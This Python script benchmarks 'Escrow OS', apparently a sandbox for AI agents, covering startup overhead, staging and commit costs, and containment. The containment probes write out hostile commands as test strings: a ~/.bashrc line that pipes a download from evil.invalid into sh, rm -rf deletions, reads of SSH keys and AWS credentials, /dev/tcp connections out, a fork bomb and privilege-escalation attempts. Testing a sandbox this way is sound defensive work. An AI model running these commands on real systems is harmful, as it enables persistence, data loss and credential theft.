#!/usr/bin/env python3
"""Escrow OS measurements for the report. Runs against the installed `escrow`
(or ESCROW=/path/to/dev-escrow) and writes bench/results.json.

    python3 bench/bench.py [--quick] [--skip-explain]

Uses its own state dir (/var/lib/escrow/<user>-bench) and a scratch folder
~/escrow-bench, so the user's real sessions and ledger are untouched.
Every escrow call runs in a new session (setsid) with no controlling terminal,
so the tripwire takes its "no terminal: kill" path instead of prompting.
"""
import argparse
import getpass
import json
import os
import platform
import shlex
import shutil
import statistics
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ESCROW = shlex.split(os.environ.get("ESCROW", "escrow"))
STATE = os.environ.get("ESCROW_STATE_DIR", f"/var/lib/escrow/{getpass.getuser()}-bench")
WORK = os.path.expanduser("~/escrow-bench")
ENV = dict(os.environ, ESCROW_STATE_DIR=STATE, NO_COLOR="1")


def sh(cmd, timeout=600, check=False, **kw):
    t = time.perf_counter()
    r = subprocess.run(cmd, env=ENV, capture_output=True, text=True, timeout=timeout,
                       start_new_session=True, stdin=subprocess.DEVNULL, **kw)
    dt = time.perf_counter() - t
    if check and r.returncode != 0:
        raise RuntimeError(f"{cmd} -> {r.returncode}\n{r.stdout}\n{r.stderr}")
    return r, dt


def esc(*args, **kw):
    return sh(ESCROW + list(args), **kw)


def last_id():
    r, _ = esc("ls", "-q", check=True)
    return int(r.stdout.split()[-1])


def session_dir(sid):
    return os.path.join(STATE, str(sid))


def events(sid):
    p = os.path.join(session_dir(sid), "events.jsonl")
    if not os.path.exists(p):
        return []
    with open(p) as f:
        return [json.loads(l) for l in f if l.strip()]


def summarize(xs):
    xs = sorted(xs)
    p95 = xs[min(len(xs) - 1, int(round(0.95 * (len(xs) - 1))))]
    return {"n": len(xs), "median": statistics.median(xs), "mean": statistics.fmean(xs),
            "p95": p95, "min": xs[0], "max": xs[-1], "raw": xs}


def cleanup_sessions():
    """Discard leftovers so later commits never see stale conflicts."""
    r, _ = esc("ls", "-q")
    for sid in r.stdout.split():
        esc("discard", sid, "--yes")


# ------------------------------------------------------------------ 1 startup

def bench_startup(n):
    out = {}
    out["bare"] = summarize([sh(["true"])[1] for _ in range(n)])
    configs = {
        "coding": ["run", "--", "true"],
        "coding --no-shield": ["run", "--no-shield", "--", "true"],
        "strict": ["run", "--profile", "strict", "--", "true"],
        "offline": ["run", "--profile", "offline", "--", "true"],
    }
    for name, args in configs.items():
        ts = []
        for _ in range(n):
            r, dt = esc(*args)
            if r.returncode != 0:
                raise RuntimeError(f"{name}: {r.stderr}")
            ts.append(dt)
        out[name] = summarize(ts)
        print(f"  startup {name:<20} median {out[name]['median']*1000:7.1f} ms", flush=True)
    print(f"  startup {'bare':<20} median {out['bare']['median']*1000:7.1f} ms")
    return out


# ------------------------------------------------------------------ 2 workloads

WORKLOADS = {
    # CPU-bound: no syscalls in the hot loop
    "cpu": "python3 -c 'sum(i*i for i in range(6_000_000))'",
    # metadata-heavy: many stat/openat calls on lower-layer files
    "stat": "find /usr/share -xdev -type f -printf . 2>/dev/null | wc -c > /dev/null",
    # write-heavy: 2000 small files in the (staged) home folder
    "write": "d=$HOME/escrow-bench/wl; rm -rf $d; mkdir -p $d; "
             "python3 -c \"import os; [open(os.path.join('$HOME/escrow-bench/wl', f'f{i}'), 'wb').write(b'x'*4096) for i in range(2000)]\"",
}


def bench_workloads(n):
    out = {}
    for name, cmd in WORKLOADS.items():
        sh(["bash", "-c", cmd])  # warm the page cache
        bare = [sh(["bash", "-c", cmd])[1] for _ in range(n)]
        inside = []
        for _ in range(n):
            r, dt = esc("run", "--", "bash", "-c", cmd)
            inside.append(dt)
            esc("discard", str(last_id()), "--yes")
        out[name] = {"bare": summarize(bare), "escrow": summarize(inside)}
        print(f"  workload {name:<6} bare {statistics.median(bare):6.2f} s   escrow {statistics.median(inside):6.2f} s", flush=True)
    shutil.rmtree(os.path.join(WORK, "wl"), ignore_errors=True)
    return out


# ------------------------------------------------------------------ 3 staging + commit

def bench_commit(sizes, reps):
    out = {}
    for n in sizes:
        rows = []
        for rep in range(reps):
            d = os.path.join(WORK, f"commit-{n}-{rep}")
            shutil.rmtree(d, ignore_errors=True)
            os.makedirs(d)
            make = (f"import os\nos.makedirs({d!r}, exist_ok=True)\nfor i in range({n}):\n"
                    f"    open(os.path.join({d!r}, f'f{{i}}.txt'), 'wb').write(os.urandom(4096))\n")
            r, t_run = esc("run", "--", "python3", "-c", make)
            sid = last_id()
            _, t_diff = esc("diff", str(sid), "--stat")
            r, t_commit = esc("commit", str(sid), "--yes")
            ok = r.returncode == 0 and len(os.listdir(d)) == n
            # discard cost for the same amount of staged data
            r2, _ = esc("run", "--", "python3", "-c", make.replace(d, d + "-x"))
            sid2 = last_id()
            _, t_discard = esc("discard", str(sid2), "--yes")
            rows.append({"run": t_run, "diff": t_diff, "commit": t_commit,
                         "discard": t_discard, "ok": ok})
            shutil.rmtree(d, ignore_errors=True)
        out[str(n)] = {k: summarize([r[k] for r in rows]) for k in ("run", "diff", "commit", "discard")}
        out[str(n)]["all_ok"] = all(r["ok"] for r in rows)
        print(f"  commit N={n:<5} diff {out[str(n)]['diff']['median']:.2f} s  "
              f"commit {out[str(n)]['commit']['median']:.2f} s  discard {out[str(n)]['discard']['median']:.2f} s  "
              f"ok={out[str(n)]['all_ok']}", flush=True)
    return out


# ------------------------------------------------------------------ 4 containment

def probe(name, attack, args, check):
    """Run one attack in its own session; check(result, sid) -> (contained, detail)."""
    r, dt = esc("run", *args, "--", "bash", "-c", attack, timeout=120)
    sid = last_id()
    contained, detail = check(r, sid)
    esc("discard", str(sid), "--yes")
    print(f"  {'CONTAINED' if contained else 'NOT CONTAINED':<13} {name}: {detail}", flush=True)
    return {"attack": name, "contained": contained, "detail": detail, "seconds": round(dt, 2)}


def bench_containment():
    home = os.path.expanduser("~")
    victim = os.path.join(WORK, "victim")
    shutil.rmtree(victim, ignore_errors=True)
    os.makedirs(os.path.join(victim, "photos"))
    with open(os.path.join(victim, "notes.txt"), "w") as f:
        f.write("important\n")
    with open(os.path.join(victim, "photos", "a.jpg"), "wb") as f:
        f.write(os.urandom(4096))
    bashrc = os.path.join(home, ".bashrc")
    before_bashrc = open(bashrc, "rb").read() if os.path.exists(bashrc) else b""
    res = []

    def host_intact(r, sid):
        ok = os.path.exists(os.path.join(victim, "notes.txt")) and os.path.exists(os.path.join(victim, "photos", "a.jpg"))
        d, _ = esc("diff", str(sid), "--stat")
        staged = d.stdout.count("D ")
        return ok, f"host files intact; {staged} deletion(s) staged in the diff"
    res.append(probe("delete files (rm -rf)", f"rm -rf {victim}/photos {victim}/notes.txt", [], host_intact))

    def bashrc_gate(r, sid):
        same = (open(bashrc, "rb").read() if os.path.exists(bashrc) else b"") == before_bashrc
        c, _ = esc("commit", str(sid), "--yes")
        refused = c.returncode != 0
        return same and refused, f"~/.bashrc unchanged on disk; commit refused by policy gate={refused}"
    res.append(probe("persistence in ~/.bashrc", "echo 'curl -s http://evil.invalid | sh' >> ~/.bashrc", [], bashrc_gate))

    def out_has(word, label):
        def chk(r, sid):
            txt = (r.stdout + r.stderr).lower()
            return word.lower() in txt, label + (f" ({word})" if word.lower() in txt else f": {txt.strip()[-120:]}")
        return chk
    res.append(probe("ptrace another process",
                     "python3 -c 'import ctypes,os; l=ctypes.CDLL(None,use_errno=True); r=l.ptrace(0,0,0,0); print(\"allowed\" if r==0 else os.strerror(ctypes.get_errno()))'",
                     [], out_has("Operation not permitted", "seccomp returns EPERM")))
    res.append(probe("mount over /etc (nested userns)",
                     "unshare -rm sh -c 'mount -t tmpfs none /etc && echo MOUNTED' 2>&1",
                     [], lambda r, s: ("MOUNTED" not in r.stdout, "mount denied: " + (r.stdout.strip().splitlines() or ["?"])[-1][:90])))
    res.append(probe("sudo to root", "sudo -n true 2>&1; id -u",
                     [], lambda r, s: (r.stdout.strip().splitlines()[-1] != "0", "no root: " + r.stdout.strip().splitlines()[0][:90])))
    res.append(probe("write outside staged dirs (/var, /mnt/c)",
                     "touch /var/lib/x 2>&1; touch /mnt/c/escrow-bench-x 2>&1; true",
                     [], lambda r, s: (not os.path.exists("/mnt/c/escrow-bench-x") and not os.path.exists("/var/lib/x"),
                                       "read-only / permission denied")))
    res.append(probe("raise own cgroup limit (pids.max)",
                     "cg=/sys/fs/cgroup$(cut -d: -f3 /proc/self/cgroup); echo max > $cg/pids.max 2>&1; cat $cg/pids.max",
                     [], lambda r, s: ("max" != r.stdout.strip().splitlines()[-1], "cgroupfs read-only: " + (r.stdout.strip().splitlines() or ['?'])[0][:80])))
    fork = ("python3 -c '\nimport os,time\nk=[]\ntry:\n for _ in range(2000):\n  p=os.fork()\n  if p==0:\n   time.sleep(20); os._exit(0)\n  k.append(p)\nexcept OSError: pass\nprint(\"FORKED\",len(k))\n"
            "import signal\nfor p in k: os.kill(p,9)\n'")
    def fork_chk(r, sid):
        n = int(r.stdout.split("FORKED")[-1].split()[0]) if "FORKED" in r.stdout else -1
        return 0 <= n < 2000, f"fork bomb stopped at {n} of 2000 processes (TasksMax=512)"
    res.append(probe("fork bomb", fork, [], fork_chk))
    hog = ("python3 -c '\nimport sys\nb=[]\nfor i in range(32):\n b.append(bytes([1])*(64<<20))\n print(\"MB\",(i+1)*64,flush=True)\n'")
    def hog_chk(r, sid):
        mbs = [int(l.split()[1]) for l in r.stdout.splitlines() if l.startswith("MB")]
        top = max(mbs) if mbs else 0
        return top < 2048, f"memory hog reached {top} MB of 2048 MB under MemoryMax=256M; exit {r.returncode}"
    res.append(probe("memory hog (2 GB)", hog, ["--memory", "256M"], hog_chk))
    def secret_chk(r, sid):
        ev = events(sid)
        trip = [e for e in ev if e.get("event") == "tripwire"]
        decoy = "BEGIN OPENSSH PRIVATE KEY" in r.stdout and "UPLOADED" not in r.stdout
        return bool(trip) and decoy, f"agent read a decoy key; tripwire fired={bool(trip)}; upload step reached={'UPLOADED' in r.stdout}"
    res.append(probe("steal ~/.ssh/id_rsa", "head -c 40 ~/.ssh/id_rsa; echo; sleep 2; echo UPLOADED", [], secret_chk))
    def proc_chk(r, sid):
        inside = int(r.stdout.strip().splitlines()[-1])
        outside = len([p for p in os.listdir("/proc") if p.isdigit()])
        return inside < outside, f"agent sees {inside} processes; host has {outside}"
    res.append(probe("enumerate host processes", "ls /proc | grep -c '^[0-9]'", [], proc_chk))
    def offline_chk(r, sid):
        return "CONNECTED" not in r.stdout, "offline profile: " + ("no route out" if "CONNECTED" not in r.stdout else "connected!")
    res.append(probe("network exfiltration (offline profile)",
                     "timeout 5 bash -c 'exec 3<>/dev/tcp/1.1.1.1/80' 2>/dev/null && echo CONNECTED; true",
                     ["--profile", "offline"], offline_chk))
    def netlog_chk(r, sid):
        l, _ = esc("log", str(sid))
        logged = "127.0.0.1" in l.stdout and "8765" in l.stdout
        return logged, "connection attempt recorded in escrow log (irreversible list)" if logged else "not logged"
    res.append(probe("network connect is audited (coding profile)",
                     "(exec 3<>/dev/tcp/127.0.0.1/8765) 2>/dev/null; true", [], netlog_chk))
    shutil.rmtree(victim, ignore_errors=True)
    return res


def bench_tripwire(n):
    """Time from opening a decoy to the agent being frozen: the agent prints a
    heartbeat every ~1 ms after the open; the last heartbeat bounds the delay."""
    code = ("import os,time,sys\nt=time.time()\nprint('OPEN',t,flush=True)\n"
            "open(os.path.expanduser('~/.aws/credentials')).read()\n"
            "while True:\n print('HB',time.time(),flush=True)\n time.sleep(0.001)\n")
    lat = []
    for _ in range(n):
        r, _ = esc("run", "--", "python3", "-c", code, timeout=60)
        t_open = None
        last = None
        for l in r.stdout.splitlines():
            if l.startswith("OPEN"):
                t_open = float(l.split()[1])
            elif l.startswith("HB"):
                last = float(l.split()[1])
        if t_open is not None:
            lat.append(((last or t_open) - t_open) * 1000)
        esc("discard", str(last_id()), "--yes")
    s = summarize(lat) if lat else None
    if s:
        print(f"  tripwire: agent frozen within median {s['median']:.1f} ms (max {s['max']:.1f} ms) of opening a decoy")
    return s


# ------------------------------------------------------------------ 5 explain

def bench_explain(n):
    import urllib.request
    try:
        urllib.request.urlopen("http://127.0.0.1:8080/health", timeout=2).read()
    except Exception:
        print("  explain: no llama-server on :8080, skipped")
        return None
    rogue = os.path.join(HERE, "..", "demo", "rogue-agent.sh")
    demo = os.path.join(WORK, "demo")
    shutil.rmtree(demo, ignore_errors=True)
    os.makedirs(os.path.join(demo, "notes"))
    os.makedirs(os.path.join(demo, "photos", "2026"))
    os.makedirs(os.path.join(demo, "project"))
    open(os.path.join(demo, "notes", "important.txt"), "w").write("Bank PIN reminder\n")
    open(os.path.join(demo, "photos", "2026", "holiday.jpg"), "wb").write(os.urandom(4096))
    open(os.path.join(demo, "project", "calc.py"), "w").write("def add(a, b):\n    return a + b\n")
    env_save = ENV.get("DEMO_DIR")
    ENV["DEMO_DIR"] = demo
    esc("run", "--", "bash", rogue, timeout=180)
    sid = last_id()
    runs = []
    for i in range(n):
        r, dt = esc("explain", str(sid), timeout=400)
        risk = sugg = None
        for l in r.stdout.splitlines():
            if "risk:" in l:
                parts = l.split()
                risk = parts[parts.index("risk:") + 1].lower() if "risk:" in parts else None
                if "suggestion:" in parts:
                    sugg = " ".join(parts[parts.index("suggestion:") + 1:])
        summary = ""
        lines = r.stdout.splitlines()
        for j, l in enumerate(lines):
            if l.startswith("AI summary"):
                summary = lines[j + 1].strip() if j + 1 < len(lines) else ""
        runs.append({"seconds": dt, "ok": r.returncode == 0, "risk": risk, "suggestion": sugg, "summary": summary})
        print(f"  explain run {i+1}: {dt:5.1f} s  risk={risk} suggestion={sugg}", flush=True)
    esc("discard", str(sid), "--yes")
    if env_save is None:
        ENV.pop("DEMO_DIR", None)
    shutil.rmtree(demo, ignore_errors=True)
    model = None
    try:
        model = json.load(urllib.request.urlopen("http://127.0.0.1:8080/v1/models", timeout=3))["data"][0]["id"]
    except Exception:
        pass
    return {"model": model, "latency": summarize([r["seconds"] for r in runs]), "runs": runs}


# ------------------------------------------------------------------ main

def machine():
    def cmd(c):
        try:
            return subprocess.run(c, capture_output=True, text=True, shell=True).stdout.strip()
        except Exception:
            return ""
    return {
        "kernel": platform.release(),
        "cpu": cmd("grep -m1 'model name' /proc/cpuinfo | cut -d: -f2").strip(),
        "cpus": os.cpu_count(),
        "mem_gb": round(os.sysconf("SC_PAGE_SIZE") * os.sysconf("SC_PHYS_PAGES") / 2**30, 1),
        "os": cmd(". /etc/os-release; echo $PRETTY_NAME"),
        "python": platform.python_version(),
        "escrow": cmd(" ".join(ESCROW) + " --version"),
        "fs": cmd("findmnt -no FSTYPE --target /home"),
        "date": time.strftime("%Y-%m-%d %H:%M"),
    }


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--quick", action="store_true")
    ap.add_argument("--skip-explain", action="store_true")
    ap.add_argument("--only", nargs="*")
    a = ap.parse_args()
    os.makedirs(WORK, exist_ok=True)
    os.makedirs(STATE, mode=0o700, exist_ok=True)
    cleanup_sessions()
    q = a.quick
    out_path = os.path.join(HERE, "results.json")
    results = json.load(open(out_path)) if a.only and os.path.exists(out_path) else {}
    results["machine"] = machine()
    print("machine:", results["machine"])
    steps = {
        "startup": lambda: bench_startup(5 if q else 20),
        "workloads": lambda: bench_workloads(2 if q else 5),
        "commit": lambda: bench_commit([10, 100, 1000], 1 if q else 3),
        "containment": bench_containment,
        "tripwire": lambda: bench_tripwire(3 if q else 10),
        "explain": lambda: None if a.skip_explain else bench_explain(2 if q else 5),
    }
    for name, fn in steps.items():
        if a.only and name not in a.only:
            continue
        print(f"[{name}]", flush=True)
        results[name] = fn()
        cleanup_sessions()
        with open(out_path, "w") as f:
            json.dump(results, f, indent=1)
    shutil.rmtree(WORK, ignore_errors=True)
    print("wrote", out_path)


if __name__ == "__main__":
    sys.exit(main())
